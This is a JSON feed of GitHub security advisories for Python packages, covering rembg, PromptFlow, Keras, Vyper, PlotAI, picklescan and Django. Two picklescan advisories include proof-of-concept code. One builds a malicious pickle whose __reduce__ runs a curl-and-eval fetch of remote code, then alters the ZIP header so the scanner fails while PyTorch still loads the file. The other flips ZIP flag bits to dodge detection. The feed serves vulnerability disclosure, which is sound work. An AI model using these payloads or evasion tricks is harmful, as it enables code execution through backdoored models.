{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the CORS middleware is setup incorrectly. All origins are reflected, which allows any website to send cross site requests to the rembg server and thus query any API. Even if authentication were to be enabled, allow_credentials is set to True, which would allow any website to send authenticated cross site requests.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25302\">https://nvd.nist.gov/vuln/detail/CVE-2025-25302</a></li>\n<li><a href=\"https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93\">https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg\">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-59qh-fmm7-3g9q\">https://github.com/advisories/GHSA-59qh-fmm7-3g9q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-59qh-fmm7-3g9q",
            "title": "[rembg] Rembg CORS misconfiguration",
            "date_modified": "2025-03-11T21:32:44.000Z",
            "date_published": "2025-03-11T21:32:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-59qh-fmm7-3g9q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the /api/remove endpoint takes a URL query parameter that allows an image to be fetched, processed and returned. An attacker may be able to query this endpoint to view pictures hosted on the internal network of the rembg server. This issue may lead to Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25301\">https://nvd.nist.gov/vuln/detail/CVE-2025-25301</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg\">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5gx-c49x-h878\">https://github.com/advisories/GHSA-r5gx-c49x-h878</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5gx-c49x-h878",
            "title": "[rembg] Rembg allows SSRF via /api/remove",
            "date_modified": "2025-03-11T21:31:03.000Z",
            "date_published": "2025-03-11T21:31:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5gx-c49x-h878"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24986\">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a\">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f\">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprr-v9f2-px3c\">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c",
            "title": "[promptflow-core] Azure PromptFlow remote code execution related to Jinja templates",
            "date_modified": "2025-03-11T20:19:56.000Z",
            "date_published": "2025-03-11T18:32:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24986\">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a\">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f\">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprr-v9f2-px3c\">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c",
            "title": "[promptflow-tools] Azure PromptFlow remote code execution related to Jinja templates",
            "date_modified": "2025-03-11T20:19:56.000Z",
            "date_published": "2025-03-11T18:32:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Keras <code>Model.load_model</code> function permits arbitrary code execution, even with <code>safe_mode=True</code>, through a manually constructed, malicious <code>.keras</code> archive. By altering the <code>config.json</code> file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem is fixed starting with version <code>3.9</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Only load models from trusted sources and model archives created with Keras.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://www.cve.org/cverecord?id=CVE-2025-1550\">https://www.cve.org/cverecord?id=CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp\">https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1550\">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n<li><a href=\"https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903\">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>\n<li><a href=\"https://github.com/keras-team/keras/releases/tag/v3.9.0\">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-48g7-3x6r-xfhp\">https://github.com/advisories/GHSA-48g7-3x6r-xfhp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-48g7-3x6r-xfhp",
            "title": "[keras] Arbitrary Code Execution via Crafted Keras Config for Model Loading",
            "date_modified": "2025-03-11T20:07:33.000Z",
            "date_published": "2025-03-11T20:07:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-48g7-3x6r-xfhp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>For the following (probably non-exhaustive) list of expressions, the compiler evaluates the arguments from right to left instead of left to right.</p>\n<pre><code>- unsafe_add\n- unsafe_sub\n- unsafe_mul\n- unsafe_div\n- pow_mod256\n- |, &amp;, ^ (bitwise operators)\n- bitwise_or (deprecated)\n- bitwise_and (deprecated)\n- bitwise_xor (deprecated)\n- raw_call\n- &lt;, &gt;, &lt;=, &gt;=, ==, !=\n- in, not in (when lhs and rhs are enums)\n</code></pre>\n<p>This behaviour becomes a problem when the evaluation of one of the arguments produces side effects that other arguments depend on. The following expressions can produce side-effect:</p>\n<ul>\n<li>state modifying external call </li>\n<li>state modifying internal call</li>\n<li><code>raw_call</code></li>\n<li><code>pop()</code> when used on a Dynamic Array stored in the storage</li>\n<li><code>create_minimal_proxy_to</code></li>\n<li><code>create_copy_of</code></li>\n<li><code>create_from_blueprint</code></li>\n</ul>\n<p>For example:</p>\n<pre><code class=\"language-Vyper\">f:uint256\n\n@internal\ndef side_effect() -&gt; uint256:\n    self.f = 12\n    return 1\n\n@external\ndef foo() -&gt; uint256:\n    return unsafe_add(self.f,self.side_effect()) # returns 13 instead of 1\n</code></pre>\n<pre><code class=\"language-Vyper\">a:DynArray[uint256, 12]\n@external\ndef bar() -&gt; bool:\n    self.a = [1,2,3]\n    return len(self.a) == self.a.pop() # return false instead of true\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>not yet patched, will address in a future release. tracking in <a href=\"https://github.com/vyperlang/vyper/issues/3604\">https://github.com/vyperlang/vyper/issues/3604</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>When using expressions from the list above, make sure that the arguments of the expression do not produce side effects or, if one does, that no other argument is dependent on those side effects.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf\">https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-40015\">https://nvd.nist.gov/vuln/detail/CVE-2023-40015</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/3604\">https://github.com/vyperlang/vyper/issues/3604</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/4019\">https://github.com/vyperlang/vyper/issues/4019</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4157\">https://github.com/vyperlang/vyper/pull/4157</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g2xh-c426-v8mf\">https://github.com/advisories/GHSA-g2xh-c426-v8mf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g2xh-c426-v8mf",
            "title": "[vyper] Vyper: reversed order of side effects for some operations",
            "date_modified": "2025-03-11T17:05:34.000Z",
            "date_published": "2023-09-04T16:39:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g2xh-c426-v8mf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"duplicate-advisory\">Duplicate Advisory</h1>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-48g7-3x6r-xfhp. This link is maintained to preserve external references.</p>\n<h1 id=\"original-description\">Original Description</h1>\n<p>The Keras Model.load_model function permits arbitrary code execution, even with safe_mode=True, through a manually constructed, malicious .keras archive. By altering the config.json file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1550\">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n<li><a href=\"https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903\">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>\n<li><a href=\"https://github.com/keras-team/keras/releases/tag/v3.9.0\">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5478-v2w6-c6q7\">https://github.com/advisories/GHSA-5478-v2w6-c6q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5478-v2w6-c6q7",
            "title": "[keras] Duplicate Advisory: Keras arbitrary code execution vulnerability",
            "date_modified": "2025-03-11T20:07:24.000Z",
            "date_published": "2025-03-11T09:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5478-v2w6-c6q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, that could result in Remote Code Execution (RCE), has been found in PlotAI. Lack of validation of LLM-generated output allows attacker to execute arbitrary Python code. PlotAI commented out vulnerable line, further usage of the software requires uncommenting it and thus accepting the risk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1497\">https://nvd.nist.gov/vuln/detail/CVE-2025-1497</a></li>\n<li><a href=\"https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde\">https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde</a></li>\n<li><a href=\"https://cert.pl/en/posts/2025/03/CVE-2025-1497\">https://cert.pl/en/posts/2025/03/CVE-2025-1497</a></li>\n<li><a href=\"https://cert.pl/posts/2025/03/CVE-2025-1497\">https://cert.pl/posts/2025/03/CVE-2025-1497</a></li>\n<li><a href=\"https://github.com/mljar/plotai\">https://github.com/mljar/plotai</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hmp-5wqg-f24h\">https://github.com/advisories/GHSA-2hmp-5wqg-f24h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hmp-5wqg-f24h",
            "title": "[plotai] PlotAI eval vulnerability",
            "date_modified": "2025-03-10T22:21:13.000Z",
            "date_published": "2025-03-10T15:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hmp-5wqg-f24h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>PickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>\n<h3 id=\"details\">Details</h3>\n<p>Python's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.</p>\n<p>PyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\nfile = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected model\ntorch.load(file)  \n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: <code>High</code></p>\n<ul>\n<li><p>Who is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.</p>\n</li>\n<li><p>What is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.</p>\n</li>\n<li><p>Potential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.</p>\n</li>\n</ul>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ul>\n<li><p>Use a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.</p>\n</li>\n<li><p>Detect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.</p>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1944\">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7q5r-7gvp-wc82",
            "title": "[picklescan] Zip Exploit Crashes Picklescan But Not PyTorch ",
            "date_modified": "2025-03-10T18:26:45.000Z",
            "date_published": "2025-03-10T18:26:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7q5r-7gvp-wc82"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>PickleScan fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>\n<h3 id=\"details\">Details</h3>\n<p>PickleScan relies on Python’s zipfile module to extract and scan files within ZIP-based model archives. However, certain flag bits in ZIP headers affect how files are interpreted, and some of these bits cause PickleScan to fail while leaving PyTorch’s loading mechanism unaffected.</p>\n<p>By modifying the flag_bits field in the ZIP file entry, an attacker can:</p>\n<ul>\n<li>Embed a malicious pickle file (bad_file.pkl) in a PyTorch model archive.</li>\n<li>Flip specific bits (e.g., 0x1, 0x20, 0x40) in the ZIP metadata.</li>\n<li>Prevent PickleScan from scanning the archive due to errors raised by zipfile.</li>\n<li>Successfully load the model with torch.load(), which ignores the flag modifications.</li>\n</ul>\n<p>This technique effectively bypasses PickleScan's security checks while maintaining model functionality.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport zipfile\nimport torch\nfrom picklescan import cli\n\ndef can_scan(zip_file):\n    try:\n        cli.print_summary(False, cli.scan_file_path(zip_file))\n        return True\n    except Exception:\n        return False\n\nbit_to_flip = 0x1  # Change to 0x20 or 0x40 to test different flag bits\n\nzip_file = \"model.pth\"\nmodel = {'a': 1, 'b': 2, 'c': 3}\ntorch.save(model, zip_file)\n\nwith zipfile.ZipFile(zip_file, \"r\") as source:\n    flipped_name = f\"flipped_{bit_to_flip}_{zip_file}\"\n    with zipfile.ZipFile(flipped_name, \"w\") as dest:\n        bad_file = zipfile.ZipInfo(\"model/bad_file.pkl\")\n        \n        # Modify the ZIP flag bits\n        bad_file.flag_bits |= bit_to_flip\n        \n        dest.writestr(bad_file, b\"bad content\")\n        for item in source.infolist():\n            dest.writestr(item, source.read(item.filename))\n\nif model == torch.load(flipped_name, weights_only=False):\n    if not can_scan(flipped_name):\n        print('Found exploitable bit:', bit_to_flip)\nelse:\n    os.remove(flipped_name)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: <code>High</code></p>\n<ul>\n<li>Who is impacted? Any organization or user relying on PickleScan to detect malicious pickle files inside PyTorch models.</li>\n<li>What is the impact? Attackers can embed malicious pickle payloads inside PyTorch models that evade PickleScan's detection but still execute upon loading.</li>\n<li>Potential Exploits: This vulnerability could be exploited in machine learning supply chain attacks, allowing attackers to distribute backdoored models on platforms like Hugging Face or PyTorch Hub.</li>\n</ul>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ul>\n<li>Improve ZIP Handling: PickleScan should use a more relaxed ZIP parser marches on when encountering modified flag bits.</li>\n<li>Scan All Embedded Files Regardless of Flags: Ensure that files with altered metadata are still extracted and analyzed.</li>\n</ul>\n<p>By addressing these issues, PickleScan can provide stronger protection against manipulated PyTorch model archives.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1945\">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/advisories/GHSA-w8jq-xcqf-f792</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w8jq-xcqf-f792",
            "title": "[picklescan] Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch",
            "date_modified": "2025-03-10T18:26:36.000Z",
            "date_published": "2025-03-10T18:26:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w8jq-xcqf-f792"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-w8jq-xcqf-f792. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>picklescan before 0.0.23 fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1945\">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2fh4-gpch-vqv4\">https://github.com/advisories/GHSA-2fh4-gpch-vqv4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2fh4-gpch-vqv4",
            "title": "[picklescan] Duplicate Advisory: Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch",
            "date_modified": "2025-03-10T18:31:04.000Z",
            "date_published": "2025-03-10T12:30:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2fh4-gpch-vqv4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-7q5r-7gvp-wc82. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1944\">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w6mr-mj53-x258\">https://github.com/advisories/GHSA-w6mr-mj53-x258</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w6mr-mj53-x258",
            "title": "[picklescan] Duplicate Advisory: Zip Exploit Crashes Picklescan But Not PyTorch ",
            "date_modified": "2025-03-10T18:25:49.000Z",
            "date_published": "2025-03-10T12:30:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w6mr-mj53-x258"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26699\">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/mar/06/security-releases\">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/06/12\">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3fp-8748-vqfq\">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq",
            "title": "[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling",
            "date_modified": "2025-03-06T22:35:39.000Z",
            "date_published": "2025-03-06T21:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26699\">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/mar/06/security-releases\">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/06/12\">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3fp-8748-vqfq\">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq",
            "title": "[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling",
            "date_modified": "2025-03-06T22:35:39.000Z",
            "date_published": "2025-03-06T21:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq"
            },
            "tags": [
                "severity"
            ]
        },
        {
